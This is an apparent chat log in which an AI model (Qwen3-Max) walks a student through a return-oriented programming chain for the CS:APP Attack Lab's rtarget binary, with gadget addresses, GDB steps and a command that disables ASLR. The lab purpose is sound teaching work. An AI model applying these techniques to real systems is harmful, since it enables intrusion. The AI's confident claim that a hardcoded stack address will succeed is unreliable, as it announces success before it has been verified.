oot@cg:~/Desktop/csapp-attacklab2# objdump -d rtarget --start-address=0x401863 --stop-address=0x401865

rtarget:     file format elf64-x86-64


Disassembly of section .text:

0000000000401863 <setval_219+0x4>:
  401863:	58                   	pop    %rax
  401864:	c3                   	retq   
root@cg:~/Desktop/csapp-attacklab2# 
Qwen3-Max
17:43:26
Perfect! ✅

You've confirmed:

asm
编辑
0000000000401863 <setval_219+0x4>:
  401863:	58                   	pop    %rax
  401864:	c3                   	retq
→ 0x401863 is indeed pop %rax; ret

Now let's confirm the second gadget:

🔍 Check 0x40185a as executable instructions
Run:

bash
编辑
objdump -d rtarget --start-address=0x40185a --stop-address=0x40185e
You should see:

asm
编辑
40185a:	48 89 c7             	mov    %rax,%rdi
40185d:	c3                   	retq
Even if objdump normally shows this as part of a movl data instruction, when executed from address 0x40185a, it decodes correctly as the 64-bit move you need.

This is a well-known ROP technique: instruction stitching or disassembly misalignment.

So your ROP chain is valid:

pop %rax; ret → loads cookie address into %rax
mov %rax, %rdi; ret → moves it to %rdi (first arg for touch3)
call touch3
🚨 But Why Still Crashing?
As established earlier:

➡️ The stack address 0x7ffffff908b0 is only valid in the GDB run where you observed it.

➡️ When you run python3 exploit.py | ./rtarget -q, it’s a different process with a different stack layout, so that address is invalid → touch3 reads garbage or unmapped memory → segfault → "Ouch!".

This is not a gadget problem — it’s an address reliability problem.

✅ Final Fix: Disable ASLR and Re-Get Address (Optional but Recommended)
Step 1: Disable ASLR
bash
编辑
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
Step 2: Get a reliable stack address from a non-GDB crash
We’ll cause a controlled crash without GDB, then use the printed register state (if any), or better — use GDB in a way that matches real execution.

But easiest: assume that with ASLR off, the stack address is stable, and just re-run your exploit.

However, to be 100% sure, let’s get the cookie address from a run that mimics the real one.

Option: Use GDB but disable its environment interference
bash
编辑
gdb ./rtarget
(gdb) set disable-randomization on
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) run -q < <(python3 -c "print('A'*89)")
When it crashes, check %rsp and find where your "3d9549ca" lands.

But honestly — for the CS:APP Attack Lab, everyone disables ASLR and uses a hardcoded address from one test run.

🧪 Try It Now
With ASLR disabled, run:

bash
编辑
python3 exploit.py | ./rtarget -q
Where exploit.py uses:

POP_RAX_RET = 0x401863
MOV_RAX_TO_RDI_RET = 0x40185a
COOKIE_ADDR = 0x7ffffff908b0 (from your GDB)
✅ This should work now.

If it still fails, temporarily add a small debug:

python
编辑
# Add after payload
# payload += b"\n"  # NOT needed — Gets() doesn't require newline
But don’t add \n — it would shift the string address!

💡 Pro Tip: Make Address More Robust
Since your string is at offset 80 in the payload, and getbuf's buffer starts at %rsp + 8 (after return addr), you could compute address as:

text
编辑
cookie_addr = saved_rsp + 80
But you don’t know saved_rsp.

So stick with ASLR off + hardcoded address.

🏁 You’re Done!
Your gadgets are correct.

Your payload structure is correct.

You just needed ASLR disabled for the stack address to be valid.

Run it — and enjoy the victory message:

text
编辑
Level 5 completed.  Congratulations!
Let me know if you want a script that auto-finds the address using GDB automation!